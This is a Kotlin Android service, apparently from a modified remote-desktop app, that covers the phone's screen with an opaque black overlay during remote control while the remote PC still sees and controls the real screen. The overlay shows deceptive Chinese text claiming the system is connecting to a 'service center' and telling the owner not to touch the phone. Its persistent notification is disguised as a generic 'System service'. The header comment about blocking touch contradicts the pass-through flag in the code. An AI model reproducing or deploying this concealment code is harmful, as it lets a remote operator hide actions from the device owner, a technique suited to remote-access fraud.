package com.carriez.flutter_hbb

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import android.net.Uri
import android.app.PendingIntent
import androidx.core.app.NotificationCompat

/**
 * Privacy Mode Service - Black Screen Overlay
 * 
 * Creates a full-screen black overlay when PC is controlling Android device.
 * - Android screen shows black overlay with warning text
 * - Touch input is completely blocked
 * - PC side still sees real screen content and can control normally
 */
class PrivacyModeService : Service() {

    companion object {
        private const val TAG = "PrivacyModeService"
        private const val CHANNEL_ID = "privacy_mode_channel"
        private const val NOTIFICATION_ID = 2001
        
        @Volatile
        private var isActive = false
        
        /**
         * Start privacy mode (black screen)
         * Thread-safe with duplicate call protection
         */
        @Synchronized
        fun startPrivacyMode(context: Context) {
            Log.d(TAG, "DEBUG_PRIVACY: startPrivacyMode called, isActive=$isActive")
            if (isActive) {
                Log.d(TAG, "DEBUG_PRIVACY: Privacy mode already active, ignoring duplicate call")
                return
            }
            Log.d(TAG, "DEBUG_PRIVACY: Creating intent to start PrivacyModeService")
            val intent = Intent(context, PrivacyModeService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Log.d(TAG, "DEBUG_PRIVACY: Starting foreground service (Android 8.0+)")
                    context.startForegroundService(intent)
                } else {
                    Log.d(TAG, "DEBUG_PRIVACY: Starting regular service")
                    context.startService(intent)
                }
                Log.d(TAG, "DEBUG_PRIVACY: Service start initiated successfully")
            } catch (e: Exception) {
                Log.e(TAG, "DEBUG_PRIVACY: Failed to start service", e)
                throw e
            }
        }
        
        /**
         * Stop privacy mode (restore normal screen)
         * Thread-safe with duplicate call protection
         */
        @Synchronized
        fun stopPrivacyMode(context: Context) {
            if (!isActive) {
                Log.d(TAG, "Privacy mode not active, ignoring stop call")
                return
            }
            Log.d(TAG, "Stopping privacy mode")
            context.stopService(Intent(context, PrivacyModeService::class.java))
        }
    }
    
    private var privacyView: TextView? = null
    private var windowManager: WindowManager? = null
    private var notificationManager: NotificationManager? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "DEBUG_PRIVACY: PrivacyModeService onCreate called")
        
        // Mark as active immediately
        isActive = true
        Log.d(TAG, "DEBUG_PRIVACY: isActive set to true")
        
        // Step 1: Check overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val hasPermission = Settings.canDrawOverlays(this)
            Log.d(TAG, "DEBUG_PRIVACY: Android M+ detected, checking overlay permission: $hasPermission")
            if (!hasPermission) {
                Log.e(TAG, "DEBUG_PRIVACY: Overlay permission not granted - CANNOT SHOW BLACK SCREEN")
                
                Handler(Looper.getMainLooper()).post {
                    Toast.makeText(this, "隐私模式需要悬浮窗权限，请在设置中开启", Toast.LENGTH_LONG).show()
                }
                
                showPermissionNotification()
                
                isActive = false
                stopSelf()
                return
            }
            Log.d(TAG, "DEBUG_PRIVACY: Overlay permission granted")
        } else {
            Log.d(TAG, "DEBUG_PRIVACY: Android < M, no permission check needed")
        }
        
        // Step 2: Create foreground notification (required for Android 8.0+)
        try {
            Log.d(TAG, "DEBUG_PRIVACY: Creating foreground notification...")
            createForegroundNotification()
            Log.d(TAG, "DEBUG_PRIVACY: Foreground notification created successfully")
        } catch (e: Exception) {
            Log.e(TAG, "DEBUG_PRIVACY: Failed to create foreground notification", e)
            isActive = false
            stopSelf()
            return
        }
        
        // Step 3: Create full-screen black overlay
        try {
            Log.d(TAG, "DEBUG_PRIVACY: Creating black overlay...")
            createBlackOverlay()
            Log.d(TAG, "DEBUG_PRIVACY: Black overlay created successfully")
        } catch (e: Exception) {
            Log.e(TAG, "DEBUG_PRIVACY: Failed to create black overlay", e)
            isActive = false
            stopSelf()
            return
        }
        
        Log.d(TAG, "DEBUG_PRIVACY: ===== Privacy mode activated successfully =====")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_NOT_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    override fun onDestroy() {
        Log.d(TAG, "onDestroy called")
        
        // Remove black overlay
        privacyView?.let { view ->
            try {
                windowManager?.removeView(view)
                Log.d(TAG, "Privacy overlay removed")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing privacy view", e)
            }
        }
        privacyView = null
        windowManager = null
        
        // Mark as inactive
        isActive = false
        
        super.onDestroy()
    }
    
    /**
     * Create foreground notification (required for Android 8.0+)
     */
    private fun createForegroundNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        // Create notification channel for Android 8.0+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "系统服务",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "后台服务运行中"
                setShowBadge(false)
            }
            notificationManager?.createNotificationChannel(channel)
        }
        
        // Build notification
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("系统服务")
            .setContentText("后台运行中")
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "Foreground notification created")
    }
    
    /**
     * Create full-screen black overlay with warning text
     */
    private fun createBlackOverlay() {
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        
        // Remove any existing view first (prevent memory leak)
        privacyView?.let { view ->
            try {
                windowManager?.removeView(view)
            } catch (e: Exception) {
                // Ignore if view was not attached
            }
        }
        
        // Create black overlay view with warning text
        privacyView = TextView(this).apply {
            setBackgroundColor(Color.argb(255, 0, 0, 0)) // 100% opacity: Completely black for local privacy, PC remote view unaffected
            text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
            setTextColor(Color.WHITE)
            textSize = 28f
            gravity = Gravity.CENTER
            
            // Hide system UI (navigation bar and status bar) to ensure full screen coverage
            @Suppress("DEPRECATION")
            systemUiVisibility = (
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            )
        }
        
        // Window type based on Android version and device manufacturer
        // OPPO/ColorOS has issues with TYPE_ACCESSIBILITY_OVERLAY, use TYPE_APPLICATION_OVERLAY directly
        val isOppoDevice = Build.MANUFACTURER.equals("OPPO", ignoreCase = true) ||
                          Build.MANUFACTURER.equals("realme", ignoreCase = true) ||
                          Build.MANUFACTURER.equals("OnePlus", ignoreCase = true) ||
                          Build.BRAND.equals("OPPO", ignoreCase = true) ||
                          Build.BRAND.equals("realme", ignoreCase = true)
        
        Log.d(TAG, "Device manufacturer: ${Build.MANUFACTURER}, Brand: ${Build.BRAND}, isOppoDevice: $isOppoDevice")
        
        val windowType = when {
            // For OPPO/realme/OnePlus, use TYPE_APPLICATION_OVERLAY directly
            isOppoDevice && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> {
                Log.d(TAG, "Using TYPE_APPLICATION_OVERLAY for OPPO device")
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            }
            // For other devices, try TYPE_ACCESSIBILITY_OVERLAY first (higher z-order)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 -> {
                Log.d(TAG, "Using TYPE_ACCESSIBILITY_OVERLAY for non-OPPO device")
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            }
            else -> {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }
        }
        
        // Window parameters
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            windowType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or  // Don't steal key focus
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or   // Keep screen on
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or // Hide status bar (fullscreen mode)
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or // Allow drawing beyond screen boundaries
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or // Cover entire screen including bars
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Allow touches to pass through (Critical for remote control)
            PixelFormat.TRANSLUCENT // Allow transparency
        ).apply {
            screenBrightness = 0.001f // Minimum brightness to hide content physically
            
            // Position at top-left corner and ensure full coverage
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
            
            // Support for notch/cutout displays (Android P and above)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
            
            // For OPPO devices, add extra flags for better compatibility
            if (isOppoDevice) {
                Log.d(TAG, "Applying OPPO-specific window flags")
                // Ensure window covers navigation bar area on OPPO
                flags = flags or WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
            }
        }
        
        // Add overlay to window with fallback mechanism
        try {
            windowManager?.addView(privacyView, params)
            Log.d(TAG, "Black overlay created and displayed with type: $windowType")
        } catch (e: Exception) {
            Log.w(TAG, "Failed with windowType $windowType, trying fallback", e)
            // Fallback to TYPE_APPLICATION_OVERLAY if initial type fails
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && windowType != WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY) {
                try {
                    params.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    windowManager?.addView(privacyView, params)
                    Log.d(TAG, "Black overlay created with fallback TYPE_APPLICATION_OVERLAY")
                } catch (e2: Exception) {
                    Log.e(TAG, "Failed to add view with fallback type", e2)
                    throw e2
                }
            } else {
                throw e
            }
        }
    }
    
    /**
     * Notify user about missing overlay permission
     */
    private fun notifyPermissionError() {
        Handler(Looper.getMainLooper()).post {
            MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                "type" to "error",
                "title" to "Permission Required",
                "text" to "Please grant 'Display over other apps' permission to use privacy mode"
            ))
        }
    }

    private fun showPermissionNotification() {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        // Ensure channel exists
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "系统服务",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "后台服务运行中"
                setShowBadge(false)
            }
            notificationManager.createNotificationChannel(channel)
        }

        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
        val pendingIntent = PendingIntent.getActivity(
            this, 
            0, 
            intent, 
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT else PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("需要权限")
            .setContentText("点击开启悬浮窗权限以使用隐私模式")
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        notificationManager.notify(NOTIFICATION_ID + 1, notification)
    }
}
